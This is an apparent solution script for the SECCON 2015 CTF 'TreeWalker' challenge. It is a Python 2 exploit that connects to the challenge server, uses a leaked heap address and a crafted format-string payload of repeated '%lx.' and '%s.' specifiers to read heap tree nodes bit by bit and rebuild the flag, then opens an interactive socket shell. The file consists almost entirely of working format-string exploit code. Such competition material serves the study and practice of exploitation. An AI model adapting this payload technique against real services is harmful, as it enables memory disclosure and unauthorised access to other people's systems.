#!/usr/bin/env python
import struct,socket,telnetlib
# seccon 2015 ctf
# Exploit 200 FSB: TreeWalker

# dump all tree node in heap

def shell():
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

def p(addr):
	return struct.pack("<Q",addr)

def read_until(token):
	data = ""
	while not data.endswith(token):
		data += f.read(1)
	return data

s = socket.create_connection(("treewalker.pwn.seccon.jp",20000))
#s = socket.create_connection(("127.0.0.1",12345))
f = s.makefile('rw',bufsize=0)

leak = read_until("\n")
print leak
leak = int(leak,16)
print "get heap address " + hex(leak)

orig_leak = leak
token_byte = ""
flag = ""

for x in xrange(64):
	count = 0x800
	payload = "A" * 0x100
	leak = leak + (32 * 8 * x)
	# create 8 node address
	for y in xrange(8):
		payload += p((leak+8) + (32 * y))
	f.write(p(count))
	payload += p(0x400000) # for debug only 
	payload = payload.ljust(count-1,"Z")
	f.write(payload + "\n")

	count = 0x100
	f.write(p(count))
	payload2 = "%lx." * 46 + "%s." * 9
	print len(payload2)
	payload2 = payload2.ljust(count-5,"Z")
	payload2 += "QQQQ"
	f.write(payload2 + "\n")

	msg = read_until("QQQQ").split(".")
	print msg

	msg =  msg[-10:-2]
	print "............"
	print msg
	print "............"

	for bits in msg:
		if bits == "":
			token_byte += "0"
		else:
			token_byte += "1"
	flag += chr(int(token_byte,2))
	token_byte = ""
	leak = orig_leak
	print flag
shell()


